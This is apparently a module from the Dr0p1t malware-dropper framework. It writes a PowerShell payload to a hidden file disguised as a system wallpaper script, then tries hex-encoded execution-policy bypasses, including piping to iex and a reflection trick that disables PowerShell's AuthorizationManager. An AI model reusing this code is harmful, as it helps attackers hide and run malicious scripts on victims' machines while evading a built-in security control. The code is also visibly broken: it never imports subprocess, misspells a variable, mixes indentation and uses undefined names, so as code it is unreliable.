#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run powershell scripts (ps1) and bypass execution policy
#Start
from binascii import hexlify,unhexlify
def F4533(tobe):
	f = open("System_wallpaper.ps1","w")
	f.write(tobe)
	f.close()
	xxx = subprocess.Popen( "attrib +s +h System_wallpaper.ps1" ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	chk_pol1cy("System_wallpaper.ps1")

def chk_pol1cy(scipt):
	command_output = subprocess.Popen('powershell -c "Get-ExecutionPolicy"',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode()
	if command_output.lower()[:3] == "res": #restricted
		runps(script)
	else: #Unrestricted
		by_pol1cy(script)

def by_pol1cy(script):
	#Stolen from some where :V
	methodss = [b'4765742d436f6e74656e74202e5c7b7d207c20506f7765725368656c6c2e657865202d6e6f70726f66696c65202d20', b'54595045202e5c7b7d207c20506f7765725368656c6c2e657865202d6e6f70726f66696c65202d', b'4765742d436f6e74656e74202e5c7b7d207c20496e766f6b652d45787072657373696f6e', b'4743202e5c7b7d207c20696578', b'506f7765725368656c6c2e657865202d457865637574696f6e506f6c69637920427970617373202d46696c65202e5c7b7d', b'66756e6374696f6e2044697361626c652d457865637574696f6e506f6c696379207b2824637478203d2024657865637574696f6e636f6e746578742e6765747479706528292e6765746669656c6428225f636f6e74657874222c226e6f6e7075626c69632c696e7374616e636522292e67657476616c7565282024657865637574696f6e636f6e7465787429292e6765747479706528292e6765746669656c6428225f617574686f72697a6174696f6e4d616e61676572222c226e6f6e7075626c69632c696e7374616e636522292e73657476616c756528246374782c20286e65772d6f626a6563742053797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e417574686f72697a6174696f6e4d616e6167657220224d6963726f736f66742e506f7765725368656c6c2229297d0a44697361626c652d457865637574696f6e506f6c6963790a2e5c7b7d0a09']
	command = "powershell -c '''{}''' "
	for method in methodss:
		p = subprocess.Popen( command.format( unhexlify( method ).decode().format( script ) ) ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
	    x = p.stdout.read().decode()
	    if x == "":
	        continue
		else:
			break

F4533(Ps1_Script_Data)
